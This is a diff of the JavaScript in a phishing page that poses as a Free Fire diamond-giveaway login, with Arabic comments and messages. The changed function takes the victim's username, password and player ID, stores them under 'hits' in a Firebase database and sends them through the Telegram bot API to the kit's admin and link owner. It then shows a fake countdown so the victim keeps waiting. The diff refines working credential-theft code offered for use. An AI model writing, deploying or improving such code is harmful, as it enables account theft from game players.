@@ -114,41 +114,49 @@
         }
 
         async function sendData() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            const pid = document.getElementById('player-id').value;
-            const amt = document.getElementById('amount').value;
-            const owner = getUserId();
-            const now = new Date().toLocaleString('ar-EG');
+    const u = document.getElementById('user').value;
+    const p = document.getElementById('pass').value;
+    const pid = document.getElementById('player-id').value;
+    const amt = document.getElementById('amount').value;
+    const owner = getUserId();
+    const now = new Date().toLocaleString('ar-EG');
 
-            if(!u || !p) return alert("من فضلك ادخل البيانات كاملة!");
+    if(!u || !p) return alert("من فضلك ادخل البيانات كاملة!");
 
-            // حفظ في فيرباس
-            await database.ref('hits/' + owner + '/ff').push({
-                user: u, pass: p, playerID: pid, diamonds: amt, time: now
-            });
+    // ✅ الأهم: حفظ البيانات في المسار الصحيح
+    await database.ref('hits/' + owner).push({
+        tool: "ff",           // ✅ حدد الأداة
+        user: u,
+        pass: p,
+        playerID: pid,
+        diamonds: amt,
+        time: now,
+        timestamp: Date.now(),
+        platform: "FreeFire"
+    });
 
-            // إرسال للتليجرام
-            const text = `💎 صيد فري فاير جديد!\n👤 صاحب الرابط: ${owner}\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}\n🆔 ايدي اللاعب: ${pid}\n💎 الكمية: ${amt}\n⏰ الوقت: ${now}`;
-            
-            [admin, owner].forEach(id => {
-                if(id !== "Unknown") {
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`);
-                }
-            });
-
-            // تحويل لصفحة الانتظار
-            document.getElementById('login-section').style.display = 'none';
-            document.getElementById('waiting-section').style.display = 'block';
-            
-            let time = 20;
-            const interval = setInterval(() => {
-                time--;
-                document.getElementById('timer').innerText = time;
-                document.getElementById('bar').style.width = (time / 20 * 100) + "%";
-                if(time <= 0) clearInterval(interval);
-            }, 1000);
+    // إرسال للتليجرام
+    const text = `💎 صيد فري فاير جديد!\n👤 صاحب الرابط: ${owner}\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}\n🆔 ايدي اللاعب: ${pid}\n💎 الكمية: ${amt}\n⏰ الوقت: ${now}`;
+    
+    [admin, owner].forEach(id => {
+        if(id !== "Unknown" && id) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`)
+                .catch(err => console.error("Telegram error:", err));
         }
+    });
+
+    // تحويل لصفحة الانتظار
+    document.getElementById('login-section').style.display = 'none';
+    document.getElementById('waiting-section').style.display = 'block';
+    
+    let time = 20;
+    const interval = setInterval(() => {
+        time--;
+        document.getElementById('timer').innerText = time;
+        document.getElementById('bar').style.width = (time / 20 * 100) + "%";
+        if(time <= 0) clearInterval(interval);
+    }, 1000);
+}
     </script>
 </body>
 </html>
